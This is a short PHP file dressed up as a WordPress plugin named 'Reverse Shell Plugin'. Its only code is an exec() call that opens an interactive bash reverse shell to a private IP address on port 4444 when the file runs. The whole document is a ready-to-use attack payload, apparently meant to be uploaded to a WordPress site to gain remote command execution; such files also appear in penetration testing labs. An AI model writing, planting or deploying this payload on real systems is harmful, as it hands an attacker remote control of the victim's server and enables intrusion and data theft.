<?php
/*
Plugin Name: Reverse Shell Plugin
Plugin URI: http://example.com/reverse-shell
Description: A simple plugin for reverse shell execution
Version: 1.0
Author: Your Name
Author URI: http://example.com
*/
?>

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'");
?>

